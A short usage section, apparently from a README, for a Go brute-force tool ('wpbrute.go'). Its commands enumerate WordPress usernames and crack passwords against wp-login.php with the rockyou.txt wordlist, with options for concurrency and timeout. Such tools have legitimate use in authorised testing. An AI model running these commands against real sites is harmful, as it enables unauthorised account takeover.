# Both modes enumerate usernames first, then crack passwords
```
go run wpbrute.go -both -w rockyou.txt -target http://example.com/wp-login.php
```

# Password-only for a known username
```
go run wpbrute.go -u admin -w rockyou.txt -target http://example.com/wp-login.php
```

# Tune concurrency and timeout
```
go run wpbrute.go -u admin -w rockyou.txt -c 20 -t 15 -v
```
